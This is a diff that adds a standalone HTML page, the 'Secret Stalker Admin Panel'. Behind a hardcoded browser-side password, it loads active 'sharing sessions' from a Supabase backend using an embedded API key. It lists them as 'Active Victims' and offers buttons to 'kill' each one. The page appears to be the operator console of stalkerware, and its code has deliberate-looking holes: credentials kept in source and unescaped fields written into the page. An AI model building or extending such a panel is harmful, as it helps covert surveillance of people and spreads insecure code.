@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secret Admin Panel</title>
+  <style>
+    body { font-family: Arial; background: #111; color: #0f0; padding: 20px; }
+    input, button { padding: 10px; margin: 5px; font-size: 16px; }
+    .log { background:#222; padding:10px; height:400px; overflow-y:scroll; }
+  </style>
+</head>
+<body>
+  <h1>🔐 Secret Stalker Admin Panel</h1>
+  
+  <input type="password" id="pass" placeholder="Enter Password" />
+  <button onclick="login()">Login</button>
+
+  <div id="panel" style="display:none;">
+    <h2>Active Victims</h2>
+    <div id="victims" class="log"></div>
+  </div>
+
+  <script>
+    const SUPABASE_URL = "https://qcmevphviezvdzfcetdt.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFjbWV2cGh2aWV6dmR6ZmNldGR0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4MjE0NTMsImV4cCI6MjA5NjM5NzQ1M30.xrikLGV-XVxd8SBi6kUBzu1GC7fc3X95c7b9jrAier4";
+    const ADMIN_PASSWORD = "kill12345";   // ← CHANGE THIS TO YOUR SECRET PASSWORD
+
+    async function login() {
+      if (document.getElementById("pass").value !== ADMIN_PASSWORD) {
+        alert("Wrong Password, you dumb fuck");
+        return;
+      }
+      document.getElementById("panel").style.display = "block";
+      loadVictims();
+    }
+
+    async function loadVictims() {
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=*&is_active=eq.true`, {
+        headers: { "apikey": SUPABASE_KEY }
+      });
+      const victims = await res.json();
+      
+      let html = "";
+      victims.forEach(v => {
+        html += `
+          <div style="margin:8px 0; padding:10px; background:#222;">
+            <strong>${v.label}</strong> - ${v.owner_id}<br>
+            <button onclick="killSession('${v.id}')">🛑 KILL THIS VICTIM</button>
+          </div>`;
+      });
+      document.getElementById("victims").innerHTML = html || "No active victims";
+    }
+
+    async function killSession(id) {
+      if (!confirm("Kill this victim?")) return;
+      
+      await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?id=eq.${id}`, {
+        method: "PATCH",
+        headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
+        body: JSON.stringify({ is_killed: true, is_active: false })
+      });
+      
+      alert("Victim killed successfully");
+      loadVictims();
+    }
+
+    // Auto refresh every 8 seconds
+    setInterval(() => { if (document.getElementById("panel").style.display === "block") loadVictims(); }, 8000);
+  </script>
+</body>
+</html>
